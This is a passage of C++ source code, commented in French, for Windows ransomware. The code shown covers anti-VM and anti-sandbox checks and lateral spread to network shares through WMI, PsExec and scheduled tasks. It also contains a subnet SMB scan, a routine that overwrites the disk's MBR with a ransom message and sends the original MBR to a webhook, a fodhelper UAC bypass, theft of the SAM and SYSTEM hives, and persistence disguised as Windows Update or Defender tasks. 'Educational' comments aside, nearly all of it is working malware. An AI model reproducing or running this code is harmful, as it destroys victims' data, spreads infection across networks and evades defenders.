            std::string driversPath = std::string(getenv("TEMP")) + "\\drivers.txt";
            std::ifstream driversFile(driversPath);
            
            std::vector<std::string> vmDrivers = {
                "vboxdrv", "vmhgfs", "vmmouse", "vboxsf", "vboxguest",
                "vmci", "vmmon", "vmnet", "vmx86", "vmdebug"
            };
            
            if (driversFile.is_open()) {
                std::string line;
                while (std::getline(driversFile, line)) {
                    for (const auto& driver : vmDrivers) {
                        if (line.find(driver) != std::string::npos) {
                            std::cout << "[!] Pilote de VM " << driver << " détecté" << std::endl;
                            isRealSystem = false;
                            break;
                        }
                    }
                    if (!isRealSystem) break;
                }
                driversFile.close();
            }
            
            // Supprimer le fichier temporaire
            std::remove(driversPath.c_str());
        }
        catch (...) {
            // Ignorer les erreurs de détection
        }
        
        // 3. Techniques avancées anti-sandbox
        try {
            // 3.1 Faire une pause longue (sandboxes ont des timeouts courts)
            auto startTime = std::chrono::high_resolution_clock::now();
            Sleep(5000); // Pause de 5 secondes
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime).count();
            
            // Si la durée est beaucoup plus courte que prévue, c'est probablement une sandbox qui accélère le temps
            if (duration < 4000) {
                std::cout << "[!] Accélération de temps détectée (sandbox)" << std::endl;
                isRealSystem = false;
            }
            
            // 3.2 Vérifier l'interaction utilisateur
            // Les sandboxes automatisées ne simulent généralement pas les mouvements de souris/clavier
            POINT initialPos, currentPos;
            GetCursorPos(&initialPos);
            Sleep(2000);
            GetCursorPos(&currentPos);
            
            // Si la souris n'a pas du tout bougé après 2 secondes, c'est suspect
            if (initialPos.x == currentPos.x && initialPos.y == currentPos.y) {
                // Compter cela comme un indice mais pas une preuve définitive
                std::cout << "[!] Aucun mouvement de souris détecté (possible sandbox)" << std::endl;
            }
            
            // 3.3 Vérifier la taille du disque dur
            ULARGE_INTEGER freeBytesAvail, totalBytes, totalFreeBytes;
            if (GetDiskFreeSpaceEx("C:\\", &freeBytesAvail, &totalBytes, &totalFreeBytes)) {
                // Les environnements sandbox ont généralement des disques plus petits
                if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // 60 GB
                    std::cout << "[!] Disque dur trop petit (" 
                              << (totalBytes.QuadPart / (1024*1024*1024)) 
                              << " GB), possible sandbox" << std::endl;
                    isRealSystem = false;
                }
            }
            
            // 3.4 Vérifier si le registre Windows a des clés suspectes
            HKEY hKey;
            LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Enum\\IDE", 0, KEY_READ, &hKey);
            
            if (result == ERROR_SUCCESS) {
                char value[256];
                DWORD valueSize = sizeof(value);
                DWORD type;
                
                // Rechercher des signes de disques virtuels
                if (RegQueryValueEx(hKey, "DeviceDesc", NULL, &type, (LPBYTE)value, &valueSize) == ERROR_SUCCESS) {
                    std::string deviceDesc = value;
                    if (deviceDesc.find("VBOX") != std::string::npos || 
                        deviceDesc.find("VMware") != std::string::npos ||
                        deviceDesc.find("QEMU") != std::string::npos) {
                        std::cout << "[!] Disque virtuel détecté dans le registre" << std::endl;
                        isRealSystem = false;
                    }
                }
                
                RegCloseKey(hKey);
            }
        }
        catch (...) {
            // Ignorer les erreurs de détection
        }
        
        // 4. Vérification du réseau
        try {
            // 4.1 Vérifier les routes réseau suspectes
            system("route print > %TEMP%\\routes.txt");
            std::string routesPath = std::string(getenv("TEMP")) + "\\routes.txt";
            std::ifstream routesFile(routesPath);
            
            if (routesFile.is_open()) {
                std::string line;
                while (std::getline(routesFile, line)) {
                    // Rechercher des réseaux de laboratoire
                    if (line.find("10.0.2.") != std::string::npos || 
                        line.find("192.168.56.") != std::string::npos) {
                        std::cout << "[!] Réseau de laboratoire détecté" << std::endl;
                        isRealSystem = false;
                        break;
                    }
                }
                routesFile.close();
            }
            
            // Supprimer le fichier temporaire
            std::remove(routesPath.c_str());
            
            // 4.2 Vérifier les adresses MAC suspectes (VM)
            std::string macAddress = getMACAddress();
            std::transform(macAddress.begin(), macAddress.end(), macAddress.begin(), ::tolower);
            
            if (macAddress.find("00:0c:29") != std::string::npos || // VMware
                macAddress.find("00:50:56") != std::string::npos || // VMware
                macAddress.find("00:05:69") != std::string::npos || // VMware
                macAddress.find("00:1c:14") != std::string::npos || // VMware
                macAddress.find("08:00:27") != std::string::npos || // VirtualBox
                macAddress.find("00:1c:42") != std::string::npos) { // Parallels
                std::cout << "[!] Adresse MAC de machine virtuelle détectée: " << macAddress << std::endl;
                isRealSystem = false;
            }
        }
        catch (...) {
            // Ignorer les erreurs de détection
        }
        
        // Décision finale sur l'exécution
        // Dans un vrai malware, nous déciderions d'arrêter ici si dans un environnement de test
        if (isRealSystem) {
            std::cout << "[+] Environnement de production détecté. Continuant l'exécution..." << std::endl;
            return true;
        } 
        
        // Pour les besoins éducatifs, nous continuons l'exécution même en cas de détection
        // Mais un vrai malware s'arrêterait ici
        std::cout << "[+] Environnement de test détecté, mais continuant pour démonstration éducative." << std::endl;
        return true;
    }

    // Fonction pour la propagation réseau
    bool propagateOverNetwork() {
        std::cout << "[*] Démarrage de la propagation réseau..." << std::endl;
        
        // Vecteur pour stocker les machines infectées
        std::vector<std::string> infectedMachines;
        
        // 1. Énumération des partages réseau disponibles
        system("net view /all > %TEMP%\\network_shares.txt");
        std::string sharesPath = std::string(getenv("TEMP")) + "\\network_shares.txt";
        std::ifstream sharesFile(sharesPath);
        
        if (sharesFile.is_open()) {
            std::string line;
            std::vector<std::string> networkMachines;
            
            // Extraire les noms des machines
            while (std::getline(sharesFile, line)) {
                if (line.find("\\\\") != std::string::npos) {
                    std::string machineName = line.substr(line.find("\\\\"));
                    machineName = machineName.substr(0, machineName.find(" "));
                    
                    if (!machineName.empty() && machineName.size() > 2) {
                        networkMachines.push_back(machineName);
                    }
                }
            }
            sharesFile.close();
            
            // Supprimer le fichier temporaire
            std::remove(sharesPath.c_str());
            
            // 2. Pour chaque machine, tenter de copier le ransomware et l'exécuter
            std::string exePath = GetExecutablePath();
            
            for (const auto& machine : networkMachines) {
                // Tester les partages communs
                std::vector<std::string> commonShares = {
                    "\\C$", "\\D$", "\\admin$", "\\IPC$", "\\print$", "\\Users", 
                    "\\Documents", "\\Public", "\\SharedDocs", "\\Share"
                };
                
                for (const auto& share : commonShares) {
                    std::string remotePath = machine + share;
                    
                    // Essayer d'accéder au partage
                    std::string accessCmd = "dir \"" + remotePath + "\" >nul 2>&1";
                    if (system(accessCmd.c_str()) == 0) {
                        // Partage accessible, tenter de copier le malware
                        std::cout << "[+] Accès trouvé: " << remotePath << std::endl;
                        
                        // Déterminer les chemins de destination possibles
                        std::vector<std::string> targetPaths = {
                            remotePath + "\\Windows\\Temp\\svchost.exe",
                            remotePath + "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winupdate.exe",
                            remotePath + "\\Users\\Public\\Security.exe"
                        };
                        
                        for (const auto& targetPath : targetPaths) {
                            // Copier l'exécutable
                            std::string copyCmd = "copy /Y \"" + exePath + "\" \"" + targetPath + "\" >nul 2>&1";
                            if (system(copyCmd.c_str()) == 0) {
                                std::cout << "[+] Malware copié vers: " + targetPath << std::endl;
                                
                                // Tenter d'exécuter à distance
                                std::string execCmd;
                                
                                // Méthode 1: utiliser WMI
                                execCmd = "wmic /node:\"" + machine.substr(2) + "\" process call create \"" + targetPath + "\" >nul 2>&1";
                                if (system(execCmd.c_str()) == 0) {
                                    std::cout << "[+] Exécuté avec succès sur: " << machine << std::endl;
                                    infectedMachines.push_back(machine);
                                    break;
                                }
                                
                                // Méthode 2: utiliser PsExec
                                execCmd = "powershell -Command \"if(Test-Path 'C:\\Windows\\System32\\PsExec.exe') { & 'C:\\Windows\\System32\\PsExec.exe' \\\\" + 
                                          machine.substr(2) + " -s \"" + targetPath + "\" } else { Write-Host 'PsExec non disponible' }\" >nul 2>&1";
                                if (system(execCmd.c_str()) == 0) {
                                    std::cout << "[+] Exécuté via PsExec sur: " << machine << std::endl;
                                    infectedMachines.push_back(machine);
                                    break;
                                }
                                
                                // Méthode 3: utiliser le planificateur de tâches
                                execCmd = "schtasks /create /s " + machine.substr(2) + " /tn \"Windows Update\" /tr \"" + 
                                          targetPath + "\" /sc onlogon /ru SYSTEM /f >nul 2>&1";
                                if (system(execCmd.c_str()) == 0) {
                                    execCmd = "schtasks /run /s " + machine.substr(2) + " /tn \"Windows Update\" >nul 2>&1";
                                    system(execCmd.c_str());
                                    std::cout << "[+] Tâche planifiée créée sur: " << machine << std::endl;
                                    infectedMachines.push_back(machine);
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
        
        // 3. Scan de vulnérabilités pour exploitation supplémentaire (EternalBlue)
        system("powershell -Command \"$ports = 139,445; $subnets = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null} | Select-Object -ExpandProperty IPv4Address).IPAddress | ForEach-Object { $ip = $_; $ip.Substring(0, $ip.LastIndexOf('.')) + '.0/24' }; foreach ($subnet in $subnets) { $ips = 1..254 | ForEach-Object { $subnet.Substring(0, $subnet.IndexOf('/')) -replace '0$', $_ }; foreach ($ip in $ips) { foreach ($port in $ports) { if (Test-NetConnection -ComputerName $ip -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue) { Write-Output \"$ip:$port\" } } } }\" > %TEMP%\\smb_targets.txt");
        
        std::string targetsPath = std::string(getenv("TEMP")) + "\\smb_targets.txt";
        std::ifstream targetsFile(targetsPath);
        
        if (targetsFile.is_open()) {
            std::vector<std::string> vulnerableHosts;
            std::string line;
            
            while (std::getline(targetsFile, line)) {
                if (!line.empty()) {
                    vulnerableHosts.push_back(line.substr(0, line.find(":")));
                }
            }
            targetsFile.close();
            
            // Exploiter les hôtes vulnérables avec un script PowerShell
            // Cette partie est une esquisse - un vrai malware utiliserait une implémentation complète d'EternalBlue
            for (const auto& host : vulnerableHosts) {
                if (std::find(infectedMachines.begin(), infectedMachines.end(), "\\\\" + host) == infectedMachines.end()) {
                    std::cout << "[*] Tentative d'exploitation SMB sur: " << host << std::endl;
                    
                    // Créer un script PowerShell pour l'exploitation (simulation)
                    std::string scriptPath = std::string(getenv("TEMP")) + "\\exploit.ps1";
                    std::ofstream exploitScript(scriptPath);
                    
                    if (exploitScript.is_open()) {
                        exploitScript << "$Target = '" << host << "'\n";
                        exploitScript << "$SourcePayload = '" << exePath << "'\n";
                        exploitScript << "$RemotePayload = '\\\\' + $Target + '\\C$\\Windows\\Temp\\svchost.exe'\n";
                        exploitScript << "try {\n";
                        exploitScript << "    Copy-Item -Path $SourcePayload -Destination $RemotePayload -Force -ErrorAction Stop\n";
                        exploitScript << "    Write-Output \"[+] Payload successfully copied to $RemotePayload\"\n";
                        exploitScript << "    # Create and execute a service to run the payload\n";
                        exploitScript << "    $ServiceName = 'Windows Update Service'\n";
                        exploitScript << "    $ServiceCommand = \"cmd.exe /c $RemotePayload\"\n";
                        exploitScript << "    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $ServiceCommand -ComputerName $Target\n";
                        exploitScript << "} catch {\n";
                        exploitScript << "    Write-Error \"Failed to exploit: $_\"\n";
                        exploitScript << "}\n";
                        exploitScript.close();
                        
                        // Exécuter le script d'exploitation
                        std::string exploitCmd = "powershell -ExecutionPolicy Bypass -File \"" + scriptPath + "\" >nul 2>&1";
                        system(exploitCmd.c_str());
                        
                        // Supprimer le script
                        std::remove(scriptPath.c_str());
                    }
                }
            }
            
            // Supprimer le fichier temporaire
            std::remove(targetsPath.c_str());
        }
        
        std::cout << "[+] Propagation terminée, " << infectedMachines.size() << " machines infectées" << std::endl;
        return !infectedMachines.empty();
    }

    // Fonction pour saboter le MBR (Master Boot Record)
    bool corruptMBR() {
        std::cout << "[*] Préparation du sabotage du MBR..." << std::endl;
        
        // Vérifier les privilèges administratifs
        bool isAdmin = false;
        HANDLE hToken;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD cbSize = sizeof(TOKEN_ELEVATION);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
                isAdmin = elevation.TokenIsElevated;
            }
            
            CloseHandle(hToken);
        }
        
        if (!isAdmin) {
            std::cout << "[!] Privilèges d'administrateur requis pour saboter le MBR" << std::endl;
            return false;
        }
        
        // Créer un payload de destruction MBR personnalisé
        // Message à afficher au démarrage après corruption
        const unsigned char mbrData[] = {
            0xB8, 0x13, 0x00,             // mov ax, 0x0013 (mode graphique)
            0xCD, 0x10,                   // int 0x10 (interruption BIOS pour changer de mode vidéo)
            0xBB, 0x00, 0x00,             // mov bx, 0x0000
            0xB9, 0x00, 0x00,             // mov cx, 0x0000
            0xBA, 0x00, 0x00,             // mov dx, 0x0000
            0xBE, 0x78, 0x7C,             // mov si, 0x7C78 (début du message)
            0xAC,                         // lodsb (charger un octet de la chaîne pointée par SI dans AL)
            0x84, 0xC0,                   // test al, al
            0x74, 0x06,                   // jz end (sauter à la fin si AL est nul)
            0xB4, 0x0E,                   // mov ah, 0x0E (fonction de téletype)
            0xB7, 0x04,                   // mov bh, 0x04 (page)
            0xCD, 0x10,                   // int 0x10 (interruption BIOS pour afficher)
            0xEB, 0xF5,                   // jmp loop (boucler)
            // Message à afficher (fin avec byte 0)
            'Y', 'O', 'U', 'R', ' ', 'P', 'C', ' ', 'I', 'S', ' ', 'E', 'N', 'C', 'R', 'Y', 'P', 'T', 'E', 'D', 0x0D, 0x0A,
            'P', 'A', 'Y', ' ', 'R', 'A', 'N', 'S', 'O', 'M', ' ', 'T', 'O', ' ', 'R', 'E', 'C', 'O', 'V', 'E', 'R', ' ', 'D', 'A', 'T', 'A', 0x0D, 0x0A,
            'I', 'D', ':', ' ', 
            // L'ID de la victime sera ajouté ici (jusqu'à 20 caractères)
        };
        
        // Créer un tampon MBR complet (512 octets)
        unsigned char mbrBuffer[512] = {0};
        
        // Copier le payload
        memcpy(mbrBuffer, mbrData, sizeof(mbrData));
        
        // Ajouter l'ID de la victime (maximum 20 caractères)
        size_t idOffset = sizeof(mbrData);
        size_t idLength = std::min(victimId.length(), size_t(20));
        memcpy(mbrBuffer + idOffset, victimId.c_str(), idLength);
        
        // Signature de boot à la fin (0x55, 0xAA)
        mbrBuffer[510] = 0x55;
        mbrBuffer[511] = 0xAA;
        
        // Écrire le MBR corrompu
        // Ouvrir un handle vers le disque physique avec accès direct
        HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                   FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
                                   FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cout << "[!] Erreur à l'ouverture du disque physique: " << GetLastError() << std::endl;
            return false;
        }
        
        // Sauvegarder le MBR original pour l'administrateur distant
        unsigned char originalMbr[512];
        DWORD bytesRead;
        
        if (ReadFile(hDevice, originalMbr, 512, &bytesRead, NULL)) {
            // Sauvegarder le MBR dans un fichier caché
            std::string mbrBackupPath = std::string(getenv("TEMP")) + "\\mbr_backup.bin";
            std::ofstream mbrBackup(mbrBackupPath, std::ios::binary);
            
            if (mbrBackup.is_open()) {
                mbrBackup.write(reinterpret_cast<char*>(originalMbr), 512);
                mbrBackup.close();
                
                // Masquer le fichier
                std::string hideCmd = "attrib +h +s \"" + mbrBackupPath + "\"";
                system(hideCmd.c_str());
                
                // Ajouter la sauvegarde aux données envoyées au serveur C&C
                // Convertir en base64
                std::string mbrBackupBase64 = base64Encode(originalMbr, 512);
                
                // Ajouter aux données envoyées
                std::stringstream mbrPayload;
                mbrPayload << "{";
                mbrPayload << "\"content\": \"MBR original pour restauration - Victime: " << victimId << "\",";
                mbrPayload << "\"embeds\": [{";
                mbrPayload << "\"title\": \"Sauvegarde MBR\",";
                mbrPayload << "\"description\": \"```" << mbrBackupBase64.substr(0, 500) << "...```\"";
                mbrPayload << "}]}";
                
                // Envoyer au webhook
                sendHttpRequest(WEBHOOK_URL, mbrPayload.str());
            }
        }
        
        // Écrire le MBR corrompu
        DWORD bytesWritten;
        bool success = WriteFile(hDevice, mbrBuffer, 512, &bytesWritten, NULL);
        
        // Fermer le handle
        CloseHandle(hDevice);
        
        if (success && bytesWritten == 512) {
            std::cout << "[+] MBR corrompu avec succès" << std::endl;
            return true;
        } else {
            std::cout << "[!] Erreur lors de la corruption du MBR: " << GetLastError() << std::endl;
            return false;
        }
    }

    // Fonction pour tenter l'élévation de privilèges
    bool elevatePrivileges() {
        std::cout << "[*] Tentative d'élévation de privilèges..." << std::endl;
        
        // Vérifier si déjà admin
        bool isAdmin = false;
        HANDLE hToken;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD cbSize = sizeof(TOKEN_ELEVATION);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
                isAdmin = elevation.TokenIsElevated;
            }
            
            CloseHandle(hToken);
        }
        
        if (isAdmin) {
            std::cout << "[+] Déjà en mode administrateur" << std::endl;
            return true;
        }
        
        std::cout << "[*] Recherche des vulnérabilités pour l'élévation de privilèges..." << std::endl;
        
        // Méthode 1: Technique UAC Bypass via COM
        std::string tempDir = std::string(getenv("TEMP"));
        std::string currentExe = getCurrentExecutablePath();
        std::string elevatedCopy = tempDir + "\\svchost_update.exe";
        
        // Copier l'exécutable actuel
        CopyFileA(currentExe.c_str(), elevatedCopy.c_str(), FALSE);
        
        // Créer un fichier batch pour élévation
        std::string batchPath = tempDir + "\\update.bat";
        std::ofstream batchFile(batchPath);
        
        if (batchFile.is_open()) {
            batchFile << "@echo off" << std::endl;
            batchFile << "echo Mise à jour du système en cours..." << std::endl;
            batchFile << "timeout /t 2 >nul" << std::endl;
            batchFile << "start \"\" \"" << elevatedCopy << "\" -elevated" << std::endl;
            batchFile << "del \"%~f0\"" << std::endl;
            batchFile.close();
            
            // Technique 1: Utiliser le planificateur de tâches pour exécuter en tant qu'admin
            std::string taskCmd = "schtasks /create /tn \"WindowsUpdate\" /tr \"" + elevatedCopy + 
                                "\" /sc once /st 00:00 /ru \"SYSTEM\" /f >nul 2>&1";
            system(taskCmd.c_str());
            system("schtasks /run /tn \"WindowsUpdate\" >nul 2>&1");
            system("schtasks /delete /tn \"WindowsUpdate\" /f >nul 2>&1");
            
            // Technique 2: Utiliser COM pour bypass UAC
            std::string comBypassCmd = "powershell -ExecutionPolicy Bypass -Command \"";
            comBypassCmd += "$windir = $env:windir; Start-Process \\\"" + elevatedCopy + "\\\" -Verb RunAs";
            comBypassCmd += "\" >nul 2>&1";
            system(comBypassCmd.c_str());
            
            // Technique 3: Utiliser l'auto-élévation de certains exécutables Windows
            // (technique connue sous le nom de "fodhelper bypass")
            std::string regCmd = "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1";
            system(regCmd.c_str());
            
            regCmd = "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"\" /t REG_SZ /d \"" + 
                    elevatedCopy + "\" /f >nul 2>&1";
            system(regCmd.c_str());
            
            // Déclencher l'exécution
            system("start ms-settings: >nul 2>&1");
            
            // Nettoyer les clés de registre après quelques secondes
            Sleep(2000);
            system("reg delete HKCU\\Software\\Classes\\ms-settings /f >nul 2>&1");
            
            // Technique 4: Exploit connu SeriousSAM (CVE-2021-36934)
            // Tenter d'exploiter la vulnérabilité SAM pour accéder aux hachages admin
            std::string exploitCmd = "powershell -ExecutionPolicy Bypass -Command \"";
            exploitCmd += "$vulnerable = Test-Path \\\"C:\\Windows\\System32\\config\\SAM\\\"; ";
            exploitCmd += "if ($vulnerable) { ";
            exploitCmd += "Copy-Item -Path \\\"C:\\Windows\\System32\\config\\SAM\\\" -Destination \\\"" + tempDir + "\\SAM.db\\\" -Force; ";
            exploitCmd += "Copy-Item -Path \\\"C:\\Windows\\System32\\config\\SYSTEM\\\" -Destination \\\"" + tempDir + "\\SYSTEM.db\\\" -Force; ";
            exploitCmd += "Write-Output \\\"[+] Fichiers SAM extraits pour exploitation ultérieure\\\" ";
            exploitCmd += "}\" >nul 2>&1";
            system(exploitCmd.c_str());
            
            // Technique 5: Exploitation potentielle PrintNightmare (CVE-2021-34527)
            std::string printCmd = "powershell -ExecutionPolicy Bypass -Command \"";
            printCmd += "Add-Type -TypeDefinition @'";
            printCmd += "using System; using System.Runtime.InteropServices; ";
            printCmd += "public class PrinterHelper { ";
            printCmd += "[DllImport(\\\"winspool.drv\\\", SetLastError = true, ExactSpelling = true)] ";
            printCmd += "public static extern IntPtr AddPrinterDriverEx(String pName, UInt32 level, IntPtr pDriverInfo, UInt32 dwFlags); ";
            printCmd += "}";
            printCmd += "'@; ";
            printCmd += "$result = [PrinterHelper]::AddPrinterDriverEx(\\\".\\\", 2, [IntPtr]::Zero, 3); ";
            printCmd += "if ($result -ne [IntPtr]::Zero) { Start-Process \\\"" + elevatedCopy + "\\\" }\" >nul 2>&1";
            system(printCmd.c_str());
        }
        
        // Attendre un peu pour voir si l'une des techniques fonctionne
        Sleep(5000);
        
        // Vérifier à nouveau si nous sommes admin
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION newElevation;
            DWORD cbSize = sizeof(TOKEN_ELEVATION);
            
            if (GetTokenInformation(hToken, TokenElevation, &newElevation, sizeof(newElevation), &cbSize)) {
                isAdmin = newElevation.TokenIsElevated;
            }
            
            CloseHandle(hToken);
        }
        
        if (isAdmin) {
            std::cout << "[+] Élévation de privilèges réussie" << std::endl;
            return true;
        } else {
            std::cout << "[!] Échec de l'élévation de privilèges, exécution en mode utilisateur limité" << std::endl;
            
            // En cas d'échec, créer une tâche planifiée pour redémarrer avec des privilèges élevés au prochain démarrage
            std::string persistenceCmd = "schtasks /create /tn \"WindowsDefender\" /tr \"" + 
                                        currentExe + "\" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1";
            system(persistenceCmd.c_str());
            
            return false;
        }
    }

    // Fonction pour détecter les machines virtuelles
    bool isVirtualMachine() {
        std::cout << "[*] Vérification de l'environnement d'exécution..." << std::endl;
        
        // Méthode 1: Vérifier les fichiers spécifiques aux VM
        std::vector<std::string> vmFiles = {
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
            "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
            "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
            "C:\\Windows\\System32\\drivers\\VBoxSF.sys",
            "C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
            "C:\\Windows\\System32\\vboxdisp.dll",
            "C:\\Windows\\System32\\vboxhook.dll",
            "C:\\Windows\\System32\\vboxogl.dll"
        };
        
        for (const auto& file : vmFiles) {
            if (fs::exists(file)) {
                std::cout << "[!] Fichier spécifique VM détecté: " << file << std::endl;
                return true;
            }
        }
        
        // Méthode 2: Vérifier les processus spécifiques aux VM
        std::vector<std::string> vmProcesses = {
            "vboxservice.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "VGAuthService.exe",
            "vmacthlp.exe",
            "vmusrvc.exe"
        };
        
        char cmdBuf[128];
        for (const auto& process : vmProcesses) {
            sprintf_s(cmdBuf, "tasklist /FI \"IMAGENAME eq %s\" | find \"%s\" >nul", 
                    process.c_str(), process.c_str());
            if (system(cmdBuf) == 0) {
                std::cout << "[!] Processus VM détecté: " << process << std::endl;
                return true;
            }
        }
        
        // Méthode 3: Vérifier les services spécifiques aux VM
        std::vector<std::string> vmServices = {
            "VMTools",
            "VBoxService",
            "VBoxGuest",
            "vmvss",
            "VMwareTools"
        };
        
        for (const auto& service : vmServices) {
            sprintf_s(cmdBuf, "sc query %s | find \"RUNNING\" >nul", service.c_str());
            if (system(cmdBuf) == 0) {
                std::cout << "[!] Service VM détecté: " << service << std::endl;
                return true;
            }
        }
        
        // Méthode 4: Vérifier le registre pour des entrées spécifiques aux VM
        std::vector<std::string> regCommands = {
            "reg query HKLM\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion | findstr /i \"VBOX\" >nul",
            "reg query HKLM\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion | findstr /i \"VMWARE\" >nul",
            "reg query HKLM\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion | findstr /i \"QEMU\" >nul",
            "reg query HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 /v Identifier | findstr /i \"VBOX\" >nul",
            "reg query HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 /v Identifier | findstr /i \"VMWARE\" >nul",
            "reg query HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools /v \"InstallPath\" >nul"
        };
        
        for (const auto& cmd : regCommands) {
            if (system(cmd.c_str()) == 0) {
                std::cout << "[!] Entrée de registre VM détectée" << std::endl;
                return true;
            }
        }
        
        // Méthode 5: Détection du matériel via CPUID
        int CPUInfo[4] = {-1};
        __cpuid(CPUInfo, 1);
        if ((CPUInfo[2] >> 31) & 1) {
            // Le bit 31 du registre ECX est défini lors de l'exécution dans une VM
            std::cout << "[!] CPUID indique un environnement virtualisé" << std::endl;
            return true;
        }
        
        // Méthode 6: Vérifier les MAC addresses commençant par adresses connues de VM
        std::string macDetectionCmd = "getmac /v | findstr /i \"00:05:69\" >nul"; // VMware
        if (system(macDetectionCmd.c_str()) == 0) {
            std::cout << "[!] Adresse MAC VMware détectée" << std::endl;
            return true;
        }
        
        macDetectionCmd = "getmac /v | findstr /i \"00:0C:29\" >nul"; // VMware
        if (system(macDetectionCmd.c_str()) == 0) {
            std::cout << "[!] Adresse MAC VMware détectée" << std::endl;
            return true;
        }
        
        macDetectionCmd = "getmac /v | findstr /i \"00:50:56\" >nul"; // VMware
        if (system(macDetectionCmd.c_str()) == 0) {
            std::cout << "[!] Adresse MAC VMware détectée" << std::endl;
            return true;
        }
        
        macDetectionCmd = "getmac /v | findstr /i \"08:00:27\" >nul"; // VirtualBox
        if (system(macDetectionCmd.c_str()) == 0) {
            std::cout << "[!] Adresse MAC VirtualBox détectée" << std::endl;
            return true;
        }
        
        // Méthode 7: Nombre de processeurs et RAM
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        
        DWORDLONG totalRamMB = memInfo.ullTotalPhys / (1024 * 1024);
        
        if (sysInfo.dwNumberOfProcessors < 2 || totalRamMB < 4096) {
            // Les machines virtuelles ont souvent peu de processeurs et de RAM
            std::cout << "[!] Configuration matérielle suspecte (peu de CPU ou RAM)" << std::endl;
            return true;
        }
        
        std::cout << "[+] Aucun environnement virtuel détecté" << std::endl;
        return false;
    }
    
    // Fonction pour détecter les environnements sandbox et d'analyse
    bool isSandbox() {
        std::cout << "[*] Vérification des environnements d'analyse..." << std::endl;
        
        // Méthode 1: Vérifier les outils et processus d'analyse connus
        std::vector<std::string> sandboxProcesses = {
            "wireshark.exe",
            "procmon.exe",
            "procmon64.exe",
            "procexp.exe",
            "procexp64.exe",
            "pestudio.exe",
            "ida.exe",
            "ida64.exe",
            "ollydbg.exe",
            "x32dbg.exe",
            "x64dbg.exe",
            "windbg.exe",
            "dnspy.exe",
            "fiddler.exe",
            "processhacker.exe"
        };
        
        char cmdBuf[128];
        for (const auto& process : sandboxProcesses) {
            sprintf_s(cmdBuf, "tasklist /FI \"IMAGENAME eq %s\" 2>nul | find \"%s\" >nul", 
                    process.c_str(), process.c_str());
            if (system(cmdBuf) == 0) {
                std::cout << "[!] Outil d'analyse détecté: " << process << std::endl;
                return true;
            }
        }
        
        // Méthode 2: Vérifier le temps d'activité du système (court = probable sandbox)
        DWORD uptime = GetTickCount() / 1000; // secondes
        if (uptime < 600) { // Moins de 10 minutes
            std::cout << "[!] Temps d'exécution du système suspect: " << uptime << " secondes" << std::endl;
            return true;
        }
        
        // Méthode 3: Vérifier les noms d'utilisateur suspects
        char username[256];
        DWORD usernameLen = sizeof(username);
        GetUserNameA(username, &usernameLen);
        
        std::vector<std::string> suspiciousUsernames = {
            "sandbox", "malware", "virus", "sample", "test", "admin", "administrator", "analyze",
            "lab", "maltest", "user", "analyst", "analysis", "sandbox", "cuckoo", "john doe"
        };
        
        std::string currentUsername(username);
        std::transform(currentUsername.begin(), currentUsername.end(), currentUsername.begin(), 
                      [](unsigned char c){ return std::tolower(c); });
        
        for (const auto& suspiciousUser : suspiciousUsernames) {
            if (currentUsername.find(suspiciousUser) != std::string::npos) {
                std::cout << "[!] Nom d'utilisateur suspect: " << username << std::endl;
                return true;
            }
        }
        
        // Méthode 4: Vérifier les noms d'ordinateur suspects
        char hostname[256];
        DWORD hostnameLen = sizeof(hostname);
        GetComputerNameA(hostname, &hostnameLen);
        
        std::vector<std::string> suspiciousHostnames = {
            "sandbox", "malware", "virus", "sample", "test", "lab", "cuckoo", "analyze", 
            "maltest", "malbox", "analyst", "analysis", "security", "vmware", "virtual", "vm"
        };
        
        std::string currentHostname(hostname);
        std::transform(currentHostname.begin(), currentHostname.end(), currentHostname.begin(), 
                      [](unsigned char c){ return std::tolower(c); });
        
        for (const auto& suspiciousHost : suspiciousHostnames) {
            if (currentHostname.find(suspiciousHost) != std::string::npos) {
